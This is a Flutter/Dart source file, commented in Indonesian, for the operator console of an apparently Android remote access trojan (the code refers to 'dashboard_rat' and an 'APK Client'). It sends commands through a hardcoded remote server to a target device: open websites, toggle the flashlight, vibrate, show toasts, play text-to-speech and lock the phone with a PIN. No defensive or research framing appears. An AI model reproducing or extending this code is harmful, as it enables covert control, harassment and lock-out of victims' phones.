import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';

class ControlCenterPage extends StatefulWidget {
  const ControlCenterPage({super.key});

  @override
  State<ControlCenterPage> createState() => _ControlCenterPageState();
}

class _ControlCenterPageState extends State<ControlCenterPage> {
  bool _isSending = false;

  // FUNGSI REAL: Mengirim perintah ke server untuk diteruskan ke APK Client
  Future<void> _sendCommand(String command, String targetId, {String? extra}) async {
    setState(() => _isSending = true);
    
    try {
      final response = await http.post(
        Uri.parse("http://fourzhost.privateserverr.web.id:3158/api/send-command"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "targetId": targetId,
          "command": command, // misal: 'vibrate', 'flashlight_on', 'tts'
          "extra": extra ?? "", // parameter tambahan misal URL website atau teks TTS
        }),
      );

      if (response.statusCode == 200) {
        _showNotif("PERINTAH BERHASIL DIKIRIM");
      } else {
        _showNotif("GAGAL: TARGET OFFLINE");
      }
    } catch (e) {
      _showNotif("ERROR: SERVER TIDAK MERESPON");
    } finally {
      setState(() => _isSending = false);
    }
  }

  void _showNotif(String m) {
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      backgroundColor: Colors.redAccent,
      content: Text(m, style: const TextStyle(fontFamily: 'ShareTechMono')),
    ));
  }

  @override
  Widget build(BuildContext context) {
    // Menangkap data device yang diklik dari dashboard_rat
    final device = ModalRoute.of(context)!.settings.arguments as Map<String, dynamic>?;
    final String targetId = device?['id'] ?? "unknown";

    final List<Map<String, dynamic>> actions = [
      {"t": "Buka Website", "s": "Remote browsing target", "i": Icons.language, "c": Colors.blue, "cmd": "open_url"},
      {"t": "Nyalakan Senter", "s": "Kontrol flashlight device", "i": Icons.flashlight_on, "c": Colors.white, "cmd": "flashlight_on"},
      {"t": "Getarkan Perangkat", "s": "Vibrate durasi custom", "i": Icons.vibration, "c": Colors.purpleAccent, "cmd": "vibrate"},
      {"t": "Teks Layar", "s": "Tampilkan toast message", "i": Icons.chat_bubble_outline, "c": Colors.greenAccent, "cmd": "toast"},
      {"t": "Kirim Suara", "s": "Text-to-Speech Google", "i": Icons.volume_up, "c": Colors.orangeAccent, "cmd": "tts"},
      {"t": "Kunci HP", "s": "Lock target dengan PIN", "i": Icons.lock_outline, "c": Colors.redAccent, "cmd": "lock_device"},
    ];

    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back_ios, size: 18),
          onPressed: () => Navigator.pop(context),
        ),
        title: Text(device?['model'] ?? "Control Center", style: const TextStyle(fontSize: 16)),
      ),
      body: Column(
        children: [
          // Header Status Target (Foto 2)
          Container(
            margin: const EdgeInsets.all(15),
            padding: const EdgeInsets.all(15),
            decoration: BoxDecoration(
              color: const Color(0xFF121420),
              borderRadius: BorderRadius.circular(15),
              border: Border.all(color: Colors.redAccent.withOpacity(0.3)),
            ),
            child: Row(
              children: [
                const CircleAvatar(backgroundColor: Colors.red, radius: 8),
                const SizedBox(width: 12),
                Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text("ID: $targetId", style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 13)),
                    const Text("REAL-TIME UPDATE ACTIVE", style: TextStyle(color: Colors.redAccent, fontSize: 9, fontWeight: FontWeight.bold)),
                  ],
                ),
                const Spacer(),
                if (_isSending) const SizedBox(width: 15, height: 15, child: CircularProgressIndicator(strokeWidth: 2, color: Colors.redAccent)),
              ],
            ),
          ),
          
          // Grid Menu Aksi
          Expanded(
            child: GridView.builder(
              padding: const EdgeInsets.all(15),
              gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                crossAxisCount: 2,
                crossAxisSpacing: 12,
                mainAxisSpacing: 12,
                childAspectRatio: 1.1,
              ),
              itemCount: actions.length,
              itemBuilder: (context, index) {
                return GestureDetector(
                  onTap: () {
                    // Eksekusi perintah real
                    if (actions[index]['cmd'] == 'open_url') {
                      _sendCommand(actions[index]['cmd'], targetId, extra: "https://google.com");
                    } else {
                      _sendCommand(actions[index]['cmd'], targetId);
                    }
                  },
                  child: Container(
                    decoration: BoxDecoration(
                      color: const Color(0xFF161B22),
                      borderRadius: BorderRadius.circular(20),
                    ),
                    child: Column(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(actions[index]['i'], color: actions[index]['c'], size: 30),
                        const SizedBox(height: 10),
                        Text(actions[index]['t'], style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 12)),
                        const SizedBox(height: 4),
                        Padding(
                          padding: const EdgeInsets.symmetric(horizontal: 10),
                          child: Text(
                            actions[index]['s'],
                            textAlign: TextAlign.center,
                            style: const TextStyle(color: Colors.white38, fontSize: 8),
                          ),
                        ),
                      ],
                    ),
                  ),
                );
              },
            ),
          ),
        ],
      ),
    );
  }
}